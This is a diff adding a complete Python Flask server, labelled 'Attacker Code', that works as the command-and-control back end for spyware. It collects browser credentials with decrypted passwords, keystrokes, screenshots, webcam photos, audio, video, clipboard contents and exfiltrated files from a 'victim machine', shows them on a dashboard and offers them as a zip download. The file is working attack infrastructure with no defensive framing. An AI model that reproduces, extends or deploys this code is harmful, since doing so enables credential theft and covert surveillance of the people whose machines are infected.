@@ -1,0 +1,775 @@
+Attacker Code:
+#libraries
+from flask import Flask, request, jsonify, render_template_string
+import os
+import json
+import base64
+import shutil
+from datetime import datetime
+import logging
+import wave
+import io
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+app = Flask(__name__)
+
+# Data storage directory
+DATA_DIR = "collected_data"
+os.makedirs(DATA_DIR, exist_ok=True)
+
+# Create all subdirectories
+folders = ['screenshots', 'files', 'audio', 'keystrokes', 'system_info', 'credentials', 'processes', 'video']
+for folder in folders:
+    folder_path = os.path.join(DATA_DIR, folder)
+    os.makedirs(folder_path, exist_ok=True)
+
+# Store data in memory
+collected_data = {
+    'browser_credentials': [],
+    'keystrokes': [],
+    'system_info': {},
+    'running_processes': [],
+    'screenshots': [],
+    'exfiltrated_files': [],
+    'audio_recordings': [],
+    'video_recordings': [],
+    'clipboard_data': []
+}
+
+print("=" * 70)
+print("🎯 ADVANCED ATTACKER SERVER")
+print("=" * 70)
+print(f"📁 Data directory: {os.path.abspath(DATA_DIR)}")
+print(f"🌐 Server URL: http://10.247.14.95:5000")
+print(f"📊 Dashboard: http://localhost:5000")
+print("=" * 70)
+
+@app.route('/')
+def dashboard():
+    """Enhanced Attacker Dashboard"""
+    stats = {
+        'credentials': len(collected_data['browser_credentials']),
+        'keystrokes': len(collected_data['keystrokes']),
+        'processes': len(collected_data['running_processes']),
+        'screenshots': len(collected_data['screenshots']),
+        'files': len(collected_data['exfiltrated_files']),
+        'audio': len(collected_data['audio_recordings']),
+        'video': len(collected_data['video_recordings'])
+    }
+    
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>🎯 Advanced Monitoring Dashboard</title>
+        <meta charset="UTF-8">
+        <style>
+            :root {
+                --bg-dark: #0a0a0a;
+                --bg-card: #1a1a1a;
+                --accent: #00ff88;
+                --text: #ffffff;
+                --warning: #ffaa00;
+            }
+            
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                background: var(--bg-dark);
+                color: var(--text);
+                padding: 20px;
+                line-height: 1.6;
+            }
+            
+            .header {
+                text-align: center;
+                margin-bottom: 30px;
+                padding-bottom: 20px;
+                border-bottom: 2px solid var(--accent);
+            }
+            
+            .header h1 {
+                color: var(--accent);
+                font-size: 2.5em;
+                margin-bottom: 10px;
+            }
+            
+            .stats-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+                gap: 15px;
+                margin-bottom: 30px;
+            }
+            
+            .stat-card {
+                background: var(--bg-card);
+                padding: 15px;
+                border-radius: 10px;
+                border-left: 4px solid var(--accent);
+                text-align: center;
+                transition: transform 0.3s;
+            }
+            
+            .stat-card:hover {
+                transform: translateY(-5px);
+            }
+            
+            .stat-number {
+                font-size: 1.8em;
+                font-weight: bold;
+                color: var(--accent);
+            }
+            
+            .stat-label {
+                color: #888;
+                font-size: 0.9em;
+                margin-top: 5px;
+            }
+            
+            .section {
+                background: var(--bg-card);
+                border-radius: 10px;
+                padding: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .section-title {
+                color: var(--accent);
+                margin-bottom: 15px;
+                padding-bottom: 10px;
+                border-bottom: 1px solid #333;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+            
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 10px;
+            }
+            
+            th {
+                background: #2a2a2a;
+                padding: 12px;
+                text-align: left;
+                color: var(--accent);
+            }
+            
+            td {
+                padding: 10px 12px;
+                border-bottom: 1px solid #333;
+                vertical-align: top;
+            }
+            
+            tr:hover { background: #2a2a2a; }
+            
+            .password-cell {
+                font-family: monospace;
+                max-width: 200px;
+                overflow: hidden;
+                text-overflow: ellipsis;
+            }
+            
+            .decrypted {
+                color: var(--accent) !important;
+                font-weight: bold;
+            }
+            
+            .failed {
+                color: var(--warning) !important;
+                font-style: italic;
+            }
+            
+            .file-list {
+                list-style: none;
+                padding: 0;
+            }
+            
+            .file-item {
+                padding: 8px;
+                border-bottom: 1px solid #333;
+                display: flex;
+                justify-content: space-between;
+            }
+            
+            .controls {
+                display: flex;
+                gap: 10px;
+                margin-bottom: 20px;
+            }
+            
+            .btn {
+                background: var(--accent);
+                color: #000;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-weight: bold;
+                text-decoration: none;
+                display: inline-block;
+            }
+            
+            .btn:hover {
+                opacity: 0.9;
+            }
+            
+            .btn-danger {
+                background: #ff5555;
+                color: white;
+            }
+            
+            .empty-msg {
+                text-align: center;
+                color: #888;
+                padding: 30px;
+                font-style: italic;
+            }
+            
+            .pre {
+                background: #000;
+                padding: 15px;
+                border-radius: 5px;
+                overflow: auto;
+                font-family: monospace;
+                font-size: 0.9em;
+                max-height: 300px;
+            }
+            
+            .audio-player {
+                width: 100%;
+                margin: 10px 0;
+                background: #000;
+                border-radius: 5px;
+                padding: 10px;
+            }
+            
+            .decrypt-btn {
+                background: var(--warning);
+                color: #000;
+                border: none;
+                padding: 5px 10px;
+                border-radius: 3px;
+                cursor: pointer;
+                font-size: 0.8em;
+                margin-left: 10px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="header">
+            <h1>🎯 ADVANCED MONITORING DASHBOARD</h1>
+            <p>Real-time surveillance from victim machine</p>
+            <p><strong>Server:</strong> 10.247.14.95:5000 | <strong>Status:</strong> <span style="color:#00ff88;">● ACTIVE</span></p>
+        </div>
+        
+        <div class="controls">
+            <button class="btn" onclick="location.reload()">🔄 Refresh</button>
+            <a href="/download_all" class="btn">📥 Download All Data</a>
+            <a href="/clear_data" class="btn btn-danger" onclick="return confirm('Clear all data?')">🗑️ Clear Data</a>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">{{ stats.credentials }}</div>
+                <div class="stat-label">Credentials</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ stats.keystrokes }}</div>
+                <div class="stat-label">Keystrokes</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ stats.files }}</div>
+                <div class="stat-label">Files</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ stats.screenshots }}</div>
+                <div class="stat-label">Screenshots</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ stats.audio }}</div>
+                <div class="stat-label">Audio</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ stats.video }}</div>
+                <div class="stat-label">Video</div>
+            </div>
+        </div>
+        <div class="section">
+            <h2 class="section-title">🔐 Browser Credentials</h2>
+            {% if credentials %}
+            <table>
+                <thead>
+                    <tr>
+                        <th>URL</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Browser</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for cred in credentials %}
+                    <tr>
+                        <td title="{{ cred.url }}">{{ cred.url[:40] }}...</td>
+                        <td>{{ cred.username[:20] }}{% if cred.username|length > 20 %}...{% endif %}</td>
+                        <td class="password-cell {% if '[DECRYPTION_FAILED]' in cred.password %}failed{% else %}decrypted{% endif %}">
+                            {{ cred.password[:20] }}{% if cred.password|length > 20 %}...{% endif %}
+                        </td>
+                        <td>{{ cred.browser }}</td>
+                        <td>
+                            {% if '[DECRYPTION_FAILED]' in cred.password %}
+                            <span style="color:#ffaa00;">❌ Failed</span>
+                            {% else %}
+                            <span style="color:#00ff88;">✅ Decrypted</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="empty-msg">No credentials captured yet</div>
+            {% endif %}
+        </div>
+        
+        <div class="section">
+            <h2 class="section-title">💻 System Information</h2>
+            {% if system_info %}
+            <div class="pre">{{ system_info | tojson(indent=2) }}</div>
+            {% else %}
+            <div class="empty-msg">No system information received yet</div>
+            {% endif %}
+        </div>
+        
+        <div class="section">
+            <h2 class="section-title">🎤 Audio Recordings</h2>
+            {% if audio_recordings %}
+            <ul class="file-list">
+                {% for audio in audio_recordings %}
+                <li class="file-item">
+                    <span>{{ audio.filename }} ({{ audio.duration }}s)</span>
+                    <span>{{ audio.timestamp }}</span>
+                </li>
+                {% endfor %}
+            </ul>
+            {% else %}
+            <div class="empty-msg">No audio recordings yet</div>
+            {% endif %}
+        </div>
+        
+        <div class="section">
+            <h2 class="section-title">📸 Recent Screenshots</h2>
+            {% if screenshots %}
+            <table>
+                <thead>
+                    <tr>
+                        <th>Filename</th>
+                        <th>Size</th>
+                        <th>Timestamp</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for ss in screenshots[-5:] %}
+                    <tr>
+                        <td>{{ ss.filename }}</td>
+                        <td>{{ ss.size }} bytes</td>
+                        <td>{{ ss.timestamp }}</td>
+                        <td><a href="/view_screenshot/{{ ss.filename }}" target="_blank">👁️ View</a></td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="empty-msg">No screenshots yet</div>
+            {% endif %}
+        </div>
+    </body>
+    </html>
+    '''
+    
+    return render_template_string(html,
+                                stats=stats,
+                                system_info=collected_data['system_info'],
+                                credentials=collected_data['browser_credentials'],
+                                keystrokes=collected_data['keystrokes'][-20:],
+                                audio_recordings=collected_data['audio_recordings'][-10:],
+                                screenshots=collected_data['screenshots'][-5:])
+
+@app.route('/receive_data', methods=['POST'])
+def receive_data():
+    """Main endpoint for receiving all data"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data'}), 400
+        
+        data_type = data.get('type')
+        payload = data.get('data', {})
+        
+        logger.info(f"📥 Received {data_type} data")
+        
+        # Handle different data types
+        if data_type == 'credentials':
+            handle_credentials(payload)
+        elif data_type == 'keystrokes':
+            handle_keystrokes(payload)
+        elif data_type == 'system_info':
+            handle_system_info(payload)
+        elif data_type == 'processes':
+            handle_processes(payload)
+        elif data_type == 'screenshot':
+            handle_screenshot(payload)
+        elif data_type == 'audio':
+            handle_audio(payload)
+        elif data_type == 'video':
+            handle_video(payload)
+        elif data_type == 'clipboard':
+            handle_clipboard(payload)
+        elif data_type == 'files':
+            handle_files_info(payload)
+        elif data_type == 'webcam':
+            handle_webcam(payload)
+        else:
+            save_generic_data(data_type, payload)
+        
+        save_all_data()
+        return jsonify({'status': 'success', 'received': data_type})
+        
+    except Exception as e:
+        logger.error(f"❌ Error in receive_data: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/receive_file', methods=['POST'])
+def receive_file():
+    """Endpoint for receiving files"""
+    try:
+        if 'file' not in request.files:
+            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
+        
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
+        
+        # Get file type from form data or filename
+        file_type = request.form.get('type', 'file')
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        safe_filename = file.filename.replace(' ', '_').replace(':', '_')
+        filename = f"{timestamp}_{safe_filename}"
+        
+        if file_type == 'audio':
+            filepath = os.path.join(DATA_DIR, 'audio', filename)
+            duration = request.form.get('duration', 0)
+            
+            file.save(filepath)
+            
+            collected_data['audio_recordings'].append({
+                'filename': filename,
+                'duration': duration,
+                'size': os.path.getsize(filepath),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            
+        elif file_type == 'video':
+            filepath = os.path.join(DATA_DIR, 'video', filename)
+            file.save(filepath)
+            
+            collected_data['video_recordings'].append({
+                'filename': filename,
+                'size': os.path.getsize(filepath),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            
+        else:
+            filepath = os.path.join(DATA_DIR, 'files', filename)
+            file.save(filepath)
+            
+            collected_data['exfiltrated_files'].append({
+                'filename': filename,
+                'original_name': file.filename,
+                'size': os.path.getsize(filepath),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+        
+        save_all_data()
+        logger.info(f"📁 File saved: {filename}")
+        
+        return jsonify({'status': 'success', 'filename': filename})
+        
+    except Exception as e:
+        logger.error(f"❌ Error in receive_file: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# Handler functions
+def handle_credentials(payload):
+    """Handle browser credentials"""
+    if isinstance(payload, list):
+        collected_data['browser_credentials'].extend(payload)
+        filename = f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        filepath = os.path.join(DATA_DIR, 'credentials', filename)
+        
+        with open(filepath, 'w', encoding='utf-8') as f:
+            json.dump(payload, f, indent=2, ensure_ascii=False)
+        
+        logger.info(f"✅ Saved {len(payload)} credentials")
+
+def handle_keystrokes(payload):
+    """Handle keystrokes"""
+    if isinstance(payload, list) and payload:
+        collected_data['keystrokes'].extend(payload)
+        filename = f"keystrokes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        filepath = os.path.join(DATA_DIR, 'keystrokes', filename)
+        
+        with open(filepath, 'w', encoding='utf-8') as f:
+            json.dump(payload, f, indent=2)
+        
+        logger.info(f"✅ Saved {len(payload)} keystrokes")
+
+def handle_system_info(payload):
+    """Handle system info"""
+    collected_data['system_info'] = payload
+    filename = f"system_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    filepath = os.path.join(DATA_DIR, 'system_info', filename)
+    
+    with open(filepath, 'w', encoding='utf-8') as f:
+        json.dump(payload, f, indent=2)
+    
+    logger.info("✅ Saved system info")
+
+def handle_processes(payload):
+    """Handle processes"""
+    if isinstance(payload, list) and payload:
+        collected_data['running_processes'] = payload
+        filename = f"processes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        filepath = os.path.join(DATA_DIR, 'processes', filename)
+        
+        with open(filepath, 'w', encoding='utf-8') as f:
+            json.dump(payload, f, indent=2)
+        
+        logger.info(f"✅ Saved {len(payload)} processes")
+
+def handle_screenshot(payload):
+    """Handle screenshot"""
+    if isinstance(payload, dict) and 'data' in payload:
+        try:
+            image_data = base64.b64decode(payload['data'])
+            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+            filepath = os.path.join(DATA_DIR, 'screenshots', filename)
+            
+            with open(filepath, 'wb') as f:
+                f.write(image_data)
+            
+            collected_data['screenshots'].append({
+                'filename': filename,
+                'size': len(image_data),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            logger.info(f"✅ Saved screenshot: {filename}")
+        except Exception as e:
+            logger.error(f"❌ Error saving screenshot: {e}")
+
+def handle_audio(payload):
+    """Handle audio data"""
+    if isinstance(payload, dict) and 'data' in payload:
+        try:
+            audio_data = base64.b64decode(payload['data'])
+            filename = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
+            filepath = os.path.join(DATA_DIR, 'audio', filename)
+            
+            with open(filepath, 'wb') as f:
+                f.write(audio_data)
+            
+            collected_data['audio_recordings'].append({
+                'filename': filename,
+                'duration': payload.get('duration', 0),
+                'size': len(audio_data),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            logger.info(f"✅ Saved audio: {filename}")
+        except Exception as e:
+            logger.error(f"❌ Error saving audio: {e}")
+
+def handle_video(payload):
+    """Handle video data"""
+    if isinstance(payload, dict) and 'data' in payload:
+        try:
+            video_data = base64.b64decode(payload['data'])
+            filename = f"video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
+            filepath = os.path.join(DATA_DIR, 'video', filename)
+            
+            with open(filepath, 'wb') as f:
+                f.write(video_data)
+            
+            collected_data['video_recordings'].append({
+                'filename': filename,
+                'size': len(video_data),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            logger.info(f"✅ Saved video: {filename}")
+        except Exception as e:
+            logger.error(f"❌ Error saving video: {e}")
+
+def handle_webcam(payload):
+    """Handle webcam photos"""
+    if isinstance(payload, dict) and 'data' in payload:
+        try:
+            # Decode image
+            image_data = base64.b64decode(payload['data'])
+            
+            # Create filename
+            timestamp = payload.get('timestamp', datetime.now().strftime("%Y%m%d_%H%M%S"))
+            filename = f"webcam_{timestamp}.jpg"
+            
+            # Save to webcam directory
+            webcam_dir = os.path.join(DATA_DIR, 'webcam')
+            os.makedirs(webcam_dir, exist_ok=True)
+            filepath = os.path.join(webcam_dir, filename)
+            
+            with open(filepath, 'wb') as f:
+                f.write(image_data)
+            
+            # Store in memory
+            if 'webcam_photos' not in collected_data:
+                collected_data['webcam_photos'] = []
+            
+            collected_data['webcam_photos'].append({
+                'filename': filename,
+                'timestamp': payload.get('timestamp', ''),
+                'photo_number': payload.get('photo_number', 0),
+                'size': len(image_data)
+            })
+            
+            logger.info(f"✅ Saved webcam photo: {filename} ({len(image_data)} bytes)")
+            
+        except Exception as e:
+            logger.error(f"❌ Error saving webcam photo: {e}")
+
+def save_webcam_photo_direct(file_bytes, filename):
+    """Save webcam photo from direct file upload"""
+    try:
+        webcam_dir = os.path.join(DATA_DIR, 'webcam')
+        os.makedirs(webcam_dir, exist_ok=True)
+        filepath = os.path.join(webcam_dir, filename)
+        
+        with open(filepath, 'wb') as f:
+            f.write(file_bytes)
+        
+        if 'webcam_photos' not in collected_data:
+            collected_data['webcam_photos'] = []
+        
+        collected_data['webcam_photos'].append({
+            'filename': filename,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'size': len(file_bytes)
+        })
+        
+        logger.info(f"✅ Saved direct webcam photo: {filename}")
+        return True
+        
+    except Exception as e:
+        logger.error(f"❌ Error saving direct webcam: {e}")
+        return False
+
+def handle_clipboard(payload):
+    """Handle clipboard data"""
+    if isinstance(payload, dict):
+        collected_data['clipboard_data'].append({
+            'data': payload.get('data', ''),
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        })
+        logger.info("✅ Saved clipboard data")
+
+def handle_files_info(payload):
+    """Handle file information"""
+    if isinstance(payload, list) and payload:
+        collected_data['exfiltrated_files'].extend(payload)
+        logger.info(f"✅ Received info for {len(payload)} files")
+
+def save_generic_data(data_type, payload):
+    """Save generic data"""
+    filename = f"{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    filepath = os.path.join(DATA_DIR, 'system_info', filename)
+    
+    with open(filepath, 'w', encoding='utf-8') as f:
+        json.dump({'type': data_type, 'data': payload}, f, indent=2)
+    
+    logger.info(f"✅ Saved {data_type} data")
+
+def save_all_data():
+    """Save all collected data"""
+    try:
+        data_file = os.path.join(DATA_DIR, 'collected_data.json')
+        with open(data_file, 'w', encoding='utf-8') as f:
+            json.dump(collected_data, f, indent=2, default=str)
+    except Exception as e:
+        logger.error(f"Error saving all data: {e}")
+
+# Additional routes
+@app.route('/view_screenshot/<filename>')
+def view_screenshot(filename):
+    """View screenshot"""
+    filepath = os.path.join(DATA_DIR, 'screenshots', filename)
+    if os.path.exists(filepath):
+        with open(filepath, 'rb') as f:
+            return f.read(), 200, {'Content-Type': 'image/png'}
+    return "Not found", 404
+
+@app.route('/download_all')
+def download_all():
+    """Download all data as zip"""
+    import zipfile
+    from io import BytesIO
+    
+    memory_file = BytesIO()
+    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for root, dirs, files in os.walk(DATA_DIR):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, DATA_DIR)
+                zf.write(file_path, arcname)
+    
+    memory_file.seek(0)
+    return memory_file.getvalue(), 200, {
+        'Content-Type': 'application/zip',
+        'Content-Disposition': 'attachment; filename=collected_data.zip'
+    }
+
+@app.route('/clear_data')
+def clear_data():
+    """Clear all collected data"""
+    for folder in folders:
+        folder_path = os.path.join(DATA_DIR, folder)
+        for filename in os.listdir(folder_path):
+            file_path = os.path.join(folder_path, filename)
+            try:
+                if os.path.isfile(file_path):
+                    os.remove(file_path)
+            except:
+                pass
+    
+    collected_data.clear()
+    save_all_data()
+    return jsonify({'status': 'success', 'message': 'Data cleared'})
+
+if __name__ == '__main__':
+    print("\n✅ ADVANCED SERVER READY!")
+    print("📡 Victim should connect to: http://10.247.14.95:5000")
+    print("👁️  View dashboard at: http://localhost:5000")
+    print("\n🎯 Features:")
+    print("   • Password decryption support")
+    print("   • Audio/video recording")
+    print("   • Screenshot capture")
+    print("   • File exfiltration")
+    print("   • Real-time dashboard")
+    print("=" * 70)
+    
+    app.run(host='10.247.14.95', port=5000, debug=True, threaded=True)
+
+
+
